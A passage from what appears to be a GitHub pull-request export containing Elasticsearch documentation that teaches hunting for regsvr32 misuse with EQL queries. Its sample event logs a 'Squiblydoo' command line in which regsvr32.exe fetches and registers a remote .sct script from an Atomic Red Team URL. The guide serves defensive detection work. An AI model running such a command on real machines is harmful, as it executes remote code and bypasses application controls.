`regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events   <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"                <2>\n+  \"\"\",\n+  \"size\": 200                                               <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 200 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Based on your previous query, you know `regsvr32` processes were associated with\n+143 events. But how was first `regsvr32.exe` called? And who called it?\n+\n+`regsvr32` is a command-line utility so narrowing your results to processes where\n+the command line was used may help.\n+\n+First, in the previous EQL query, change the `any` keyword to `process`. This\n+means the query will only match processes, which have an `event.category` of\n+`process`.\n+\n+Next, append `and process.command_line != null` to the query. Now the query will\n+only match processes with a command line value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    process where process.name == \"regsvr32.exe\" and process.command_line != null\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one process. The event has an `event.type` of `creation`,\n+indicating the start of a `regsvr32.exe` process. Based on the\n+`process.command_line` value, `regsvr32.exe` was used to register a script as\n+`scrobj.dll`. This fits the behavior of a\n+https://attack.mitre.org/techniques/T1218/010/[\"Squiblydoo\" attack], a known\n+variant of `regsvr32` misuse.\n+\n+The query also retrieved other valuable information about how the `regsvr32.exe`\n+process started, such as the `@timestamp`, the associated `user.id`, and the\n+`process.parent.name`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that a `regsvr32.exe` process was used to register a potentially\n+malicious script as `scrob.dll`. Next, see if `regsvr32.exe` later loads the", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323"}, "originalPosition": 210}]}}, {"__typename": "PullRequestCommit", "commit": {"oid": "9fd41d18aea4aa5bcff39b5ca07d4f74a25ca774", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/9fd41d18aea4aa5bcff39b5ca07d4f74a25ca774", "committedDate": "2020-08-14T15:05:13Z", "message": "typo"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "0197764277b8608d6a3a68300a4e9ee1915c558f", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/0197764277b8608d6a3a68300a4e9ee1915c558f", "committedDate": "2020-08-14T15:16:41Z", "message": "update sequence query section"}}, {"__typename": "PullRequestCommit", "commit": {"oid": "e5725ef17e5ff032b080355229a4b074d407345f", "author": {"user": {"login": "jrodewig", "name": "James Rodewig"}}, "url": "https://github.com/elastic/elasticsearch/commit/e5725ef17e5ff032b080355229a4b074d407345f", "committedDate": "2020-08-14T15:18:04Z", "message": "reword"}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NjY2OTU2", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467666956", "createdAt": "2020-08-14T15:23:21Z", "commit": {"oid": "e5725ef17e5ff032b080355229a4b074d407345f"}, "state": "APPROVED", "comments": {"totalCount": 0, "pageInfo": {"startCursor": null, "endCursor": null, "hasNextPage": false, "hasPreviousPage": false}, "nodes": []}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3Njk1NjA2", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467695606", "createdAt": "2020-08-14T16:05:22Z", "commit": {"oid": "e5725ef17e5ff032b080355229a4b074d407345f"}, "state": "APPROVED", "comments": {"totalCount": 0, "pageInfo": {"startCursor": null, "endCursor": null, "hasNextPage": false, "hasPreviousPage": false}, "nodes": []}}]}}}, "rateLimit": {"limit": 5000, "remaining": 2336, "cost": 1, "resetAt": "2021-10-28T18:54:27Z"}}}